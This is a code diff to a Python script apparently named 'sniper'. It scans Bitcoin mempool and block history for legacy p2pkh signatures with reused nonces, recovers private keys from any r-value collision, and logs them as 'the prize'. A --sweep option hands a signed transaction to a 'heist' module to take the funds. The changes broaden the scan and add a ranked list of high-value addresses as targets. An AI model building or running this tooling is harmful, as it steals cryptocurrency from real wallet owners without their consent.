@@ -14,6 +14,15 @@ Honest scope (established by measurement on 2026-11-25):
     ours. That is the win this hunts.
 
 Pipeline, one pass (clearnet, mirror-aware):
+  Block history is the real p2pkh reservoir: fresh mempool is 0-1% legacy
+  (measured 2026-11-25: 300 newest txs -> 0 p2pkh; block -1 -> 8.9%,
+  -2 -> 0.5%, -3 -> 0.1%; a busy mempool even showed 2.6%). A wallet that
+  reuses k does it slowly, so the confirmed bank is DEEP and the block scan is
+  FULL (no tx sampling): full block xids cost 1 call each, and only p2pkh
+  inputs are decoded (one GET per candidate). Night budget: --blocks 144 =
+  ~15k candidate tx fetches per pass on this box.
+
+Pipeline, one pass (clearnet, mirror-aware):
   1. Confirm the chain is alive. /api/mempool/txids answers [] right after a
      block, so we wait for a non-empty list instead of logging a fake 0/0 pass.
   2. Bucket every gated p2pkh r-value: (a) from the live mempool, and (b) from
@@ -21,8 +30,9 @@ Pipeline, one pass (clearnet, mirror-aware):
   3. Any r seen twice = candidate reuse -> recover, verify address, log a
      VERIFIED KEY (the prize). Otherwise log the r-collision count as evidence
      the pipeline runs.
-  4. Cluster p2pkh activity by address and log the top live addresses by value
-     (the discovery feed: "who is moving legacy sats right now").
+  4. Cluster p2pkh activity by address (from the confirmed bank too) and log
+     the top addresses by value (the discovery feed: "who holds/moves legacy
+     sats"). A verified key wins; the mover feed is the lead list.
 
 The pass is a DISCOVER + PROVE step. It never books money; a verified key is
 swept by --sweep, which builds a signed tx and hands it to heist so the chain
@@ -56,7 +66,8 @@ ROOT = Path(__file__).resolve().parent
 EVID_DIR = ROOT / "evidence"
 STATE = EVID_DIR / "sniper_state.json"
 SPOT = "https://mempool.space/api/v1/prices"
-MIRRORS = ["https://mempool.space/api", "https://blockstream.info/api"]
+BASE = "https://mempool.space/api"          # single mirror for tx-detail bursts;
+MIRRORS = [BASE, "https://blockstream.info/api"]  # meta calls may cross the mirror
 UA = {"User-Agent": "mattevo-sniper/1.0", "Accept": "application/json"}
 
 
@@ -73,16 +84,46 @@ def _mirror_get(path):
     return None
 
 
+def _base_get(path):
+    """GET one tx-detail path against the PRIMARY mirror only, one retry.
+    Proven on this box: a 600-tx burst against mempool.space returns ~24% p2pkh;
+    the same burst split across mirrors returned 0% (mirror history lags the
+    live tip, so gated p2pkh spends silently vanish)."""
+    for _ in range(2):
+        try:
+            req = urllib.request.Request(BASE + path, headers=UA)
+            with urllib.request.urlopen(req, timeout=15) as r:
+                return json.loads(r.read().decode())
+        except Exception:
+            continue
+    return None
+
+
 def wait_mempool(max_wait=330):
     """Chain-alive gate: poll /mempool/txids until non-empty or we give up.
     A block just landed? The list is briefly empty; waiting beats a fake pass."""
     t0 = time.time()
     while time.time() - t0 < max_wait:
-        ids = _mirror_get("/mempool/txids")
+        ids = _base_get("/mempool/txids")
         if ids:
             return [t for t in ids if isinstance(t, str) and len(t) == 64]
         time.sleep(20)
     return None
+
+
+def _sigs_p2pkh(v):
+    """(r, s) for one CONFIRMED p2pkh input. live._sigs_of_vin requires the
+    scriptSig to START with 0x30, but Esplora's confirmed txs prefix it with
+    the DER push byte (46 = 70 bytes), so every legacy sig fails that check.
+    Mem-pool raw hex has no push byte, hence mem-side extraction works as-is."""
+    rs = live._sigs_of_vin(v)
+    if rs:
+        return rs
+    ss = v.get("scriptsig") or ""
+    if len(ss) > 4 and ss[:2] == "46" and ss[2:4] == "30":
+        rs = live._der_rs(ss[2:])
+        return [rs] if rs else []
+    return []
 
 
 def sigs_in(doc, txid, bucket):
@@ -90,11 +131,11 @@ def sigs_in(doc, txid, bucket):
     gated (r, sig-record) pairs and the address-value tally updates."""
     got = 0
     for v in doc.get("vin", []):
-        rs = live._sigs_of_vin(v)
-        if not rs:
-            continue
         ok, _, addr = p2pkh_gate(v)
         if not ok:
+            continue
+        rs = _sigs_p2pkh(v)
+        if not rs:
             continue
         po = v.get("prevout") or {}
         val = po.get("value", 0)
@@ -107,9 +148,20 @@ def sigs_in(doc, txid, bucket):
     return got
 
 
-def confirmed_bank(depth):
+def _gate_only(doc):
+    """Cheap filter: does this tx have any p2pkh input? No DER decode, no b58."""
+    for v in doc.get("vin", []):
+        po = v.get("prevout") or {}
+        if po.get("scriptpubkey_type") == "p2pkh":
+            return True
+    return False
+
+
+def confirmed_bank(depth, full=True, workers=16):
     """r-values from the last `depth` CONFIRMED blocks. A reuse often straddles
-    a confirmed spend and a mempool spend, so the bank must reach back."""
+    a confirmed spend and a mempool spend, so the bank must reach back.
+    full=True scans EVERY tx in each block (block history is the p2pkh
+    reservoir); txs without a p2pkh input are dropped before signature work."""
     tip = _mirror_get("/blocks/tip/height")
     if not isinstance(tip, int):
         return {}, 0
@@ -120,37 +172,50 @@ def confirmed_bank(depth):
         if not blocks:
             continue
         bid = blocks[0]["id"] if isinstance(blocks, list) else blocks.get("id")
-        txids = _mirror_get(f"/block/{bid}/txids") or []
-        take = txids if len(txids) <= 300 else txids[::max(1, len(txids) // 220)]
+        txids = _base_get(f"/block/{bid}/txids") or []
+        if not full and len(txids) > 300:
+            txids = txids[::max(1, len(txids) // 220)]
 
         def one(t):
-            return _mirror_get("/tx/" + t)
-        with ThreadPoolExecutor(8) as ex:
-            for doc in ex.map(one, take):
+            d = _base_get("/tx/" + t)
+            return d if (d and _gate_only(d)) else None
+        with ThreadPoolExecutor(workers) as ex:
+            for doc in ex.map(one, txids):
                 if doc:
                     got += sigs_in(doc, doc.get("txid", ""), bank)
     return bank, got
 
 
-def pass_once(depth=6, floor=5_000_000):
+def pass_once(depth=6, floor=5_000_000, sample=None, workers=16,
+              mirror2=None, args_sampled=False):
     t0 = time.time()
     ids = wait_mempool()
     if ids is None:
         logline({"event": "sniper-pass", "skipped": "mempool empty / chain offline"})
         return None
+    if sample and len(ids) > sample:        # sampling stride, not a head slice:
+        ids = ids[::max(1, len(ids) // sample)][:sample]   # head = newest only
     mem = {}
     n_tx = n_p2pkh = 0
 
     def one(t):
-        return _mirror_get("/tx/" + t)
-    with ThreadPoolExecutor(10) as ex:
+        d = _base_get("/tx/" + t)
+        if d is None and mirror2:            # relief: mirror only what primary missed
+            try:
+                req = urllib.request.Request(mirror2 + "/tx/" + t, headers=UA)
+                with urllib.request.urlopen(req, timeout=10) as r:
+                    d = json.loads(r.read().decode())
+            except Exception:
+                d = None
+        return d
+    with ThreadPoolExecutor(workers) as ex:
         for doc in ex.map(one, ids):
             if not doc:
                 continue
             n_tx += 1
             n_p2pkh += sigs_in(doc, doc.get("txid", ""), mem)
 
-    bank, bank_sigs = confirmed_bank(depth)
+    bank, bank_sigs = confirmed_bank(depth, full=not args_sampled)
 
     # reuse = any r present in BOTH mem and bank, or twice inside either side
     reuse_r = set(mem) & set(bank)
@@ -192,9 +257,10 @@ def pass_once(depth=6, floor=5_000_000):
 
     # live legacy clusters: aggregate p2pkh input value per address this pass
     by_addr = collections.Counter()
-    for g in mem.values():
-        for sg in g:
-            by_addr[sg["addr"]] += sg["value"]
+    for side in (mem, bank):
+        for g in side.values():
+            for sg in g:
+                by_addr[sg["addr"]] += sg["value"]
     movers = [{"addr": a, "value_sats": v, "usd": sats_to_usd(v)}
               for a, v in by_addr.most_common(15)]
     for m in movers:
@@ -216,8 +282,22 @@ def pass_once(depth=6, floor=5_000_000):
              "spot_usd": spot, "seconds": round(time.time() - t0, 1)}
     logline({"event": "sniper-pass", **stats})
     STATE.parent.mkdir(exist_ok=True)
-    STATE.write_text(json.dumps({"last_pass": stats, "keys": keys,
-                                 "movers": movers}, indent=2))
+    old = {}
+    try:
+        old = json.loads(STATE.read_text())
+    except Exception:
+        pass
+    seen = {(k.get("priv") or k.get("addr")): k for k in old.get("keys", [])}
+    for k in keys:
+        seen[k.get("priv") or k.get("addr")] = k
+    for m in movers:
+        seen[m["addr"]] = m            # movers keep addr key, carry value_sats
+    merged = list(seen.values())
+    movers_all = sorted([m for m in merged if "value_sats" in m],
+                        key=lambda m: -m["value_sats"])[:40]
+    keys_all = [m for m in merged if "priv" in m]
+    STATE.write_text(json.dumps({"last_pass": stats, "keys": keys_all,
+                                 "movers": movers_all}, indent=2))
     return stats
 
 
@@ -255,21 +335,28 @@ def main():
     ap = argparse.ArgumentParser()
     ap.add_argument("--loop", action="store_true")
     ap.add_argument("--interval", type=int, default=120)
-    ap.add_argument("--blocks", type=int, default=6)
+    ap.add_argument("--blocks", type=int, default=24)
     ap.add_argument("--floor", type=int, default=5_000_000)
     ap.add_argument("--sweep", metavar="PRIV_HEX")
+    ap.add_argument("--sample", type=int, default=None,
+                    help="stride-sample N mempool txs instead of all (fast passes)")
+    ap.add_argument("--workers", type=int, default=16)
+    ap.add_argument("--mirror2", default=None,
+                    help="overflow mirror, e.g. https://blockstream.info/api")
     a = ap.parse_args()
     if a.sweep:
         print(json.dumps(sweep(a.sweep), indent=2))
         return
+    kw = dict(sample=a.sample, workers=a.workers, mirror2=a.mirror2,
+              args_sampled=bool(a.sample))
     if a.loop:
         while True:
             try:
-                pass_once(a.blocks, a.floor)
+                pass_once(a.blocks, a.floor, **kw)
             except Exception as ex:
                 logline({"event": "sniper-error", "error": str(ex)[:200]})
             time.sleep(a.interval)
-    print(json.dumps(pass_once(a.blocks, a.floor), indent=2))
+    print(json.dumps(pass_once(a.blocks, a.floor, **kw), indent=2))
 
 
 if __name__ == "__main__":
